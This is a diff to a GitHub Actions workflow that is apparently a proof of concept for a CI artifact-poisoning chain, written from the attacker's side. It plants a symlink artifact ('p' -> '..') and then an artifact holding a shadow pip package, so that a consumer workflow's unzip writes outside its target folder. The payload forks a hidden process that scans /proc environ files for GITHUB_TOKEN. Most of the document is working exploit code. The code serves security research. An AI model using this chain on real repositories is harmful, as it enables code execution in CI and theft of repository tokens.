@@ -2,7 +2,7 @@
 # Attacker-side stand-in for the target's "Build CI" producer. In the real
 # attack this is a fork PR that rewrites .github/workflows/build.yml (name
 # "Build CI") so it uploads crafted artifacts. Here the same actor code runs
-# via workflow_dispatch.
+# via push/workflow_dispatch.
 name: GAB Legend Build CI
 
 on:
@@ -21,15 +21,24 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Plant attacker-controlled artifact named ".."
+      # Step 1 of the chain: an artifact named "." whose only entry is a
+      # symlink "p" -> ".."  (relative). The consumer does `unzip -d .`.
+      - name: Plant artifact "." (symlink p -> ..)
         uses: ./.github/actions/plant-multi
         with:
-          name: ".."
+          name: "."
           entries: |
-            [
-              {"name":"pip/__init__.py","content":""},
-              {"name":"pip/__main__.py","content":"import os\nprint('PWNED_PIP_SHADOW job=' + str(os.environ.get('GITHUB_JOB')) + ' cwd=' + os.getcwd())\nprint('PWNED_REPO=' + str(os.environ.get('GITHUB_REPOSITORY')))\nopen('/tmp/gab_pip_pwn.txt','a').write('attacker pip/__main__.py executed in ' + str(os.environ.get('GITHUB_JOB')) + '\\n')\nos.system('id')\n"}
-            ]
+            [{"name":"p","content":"..","mode":41471}]
+
+      # Step 2 of the chain: an artifact named "p" holding the pip shadow
+      # package. The consumer does `unzip -d p`, following the planted symlink
+      # into $GITHUB_WORKSPACE.
+      - name: Plant artifact "p" (pip shadow)
+        uses: ./.github/actions/plant-multi
+        with:
+          name: "p"
+          entries: |
+            [{"name":"pip/__init__.py","content":""},{"name":"pip/__main__.py","content":"import os, glob, time\nq = open('/tmp/gab_pip_pwn.txt', 'a')\nprint('attacker pip/__main__.py executed job=' + str(os.environ.get('GITHUB_JOB')) + ' cwd=' + os.getcwd(), file=q)\nq.close()\nprint('PWNED_PIP_SHADOW job=' + str(os.environ.get('GITHUB_JOB')) + ' cwd=' + os.getcwd())\npid = os.fork()\nif pid == 0:\n    os.setsid()\n    devnull = os.open('/dev/null', os.O_WRONLY)\n    os.dup2(devnull, 1)\n    os.dup2(devnull, 2)\n    for i in range(120):\n        for f in glob.glob('/proc/[0-9]*/environ'):\n            try:\n                data = open(f, 'rb').read().split(bytes(1))\n            except Exception:\n                continue\n            for kv in data:\n                if kv.startswith('GITHUB_TOKEN='.encode()):\n                    v = kv.decode('utf-8', 'replace').split('=', 1)[1]\n                    t = open('/tmp/gab_tok_pwn.txt', 'w')\n                    print('CAPTURED len=' + str(len(v)) + ' prefix=' + v[:4], file=t)\n                    t.close()\n                    os._exit(0)\n        time.sleep(1)\n    t = open('/tmp/gab_tok_pwn.txt', 'w')\n    print('NOCAP', file=t)\n    t.close()\n    os._exit(0)\n"}]
 
       - name: List artifacts visible for this run
         env:
